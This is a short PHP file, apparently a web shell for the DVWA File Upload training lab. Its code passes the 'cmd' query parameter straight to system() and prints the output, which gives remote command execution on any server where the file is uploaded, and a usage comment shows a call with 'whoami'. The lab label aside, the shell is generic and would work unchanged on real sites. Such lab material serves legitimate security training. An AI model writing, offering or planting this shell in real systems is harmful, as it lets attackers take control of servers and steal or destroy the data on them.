<?php
// Simple PHP web shell for DVWA File Upload lab
// Usage: shell.php?cmd=whoami

if(isset($_GET['cmd'])) {
    echo "<pre>";
    system($_GET['cmd']);
    echo "</pre>";
}
?>
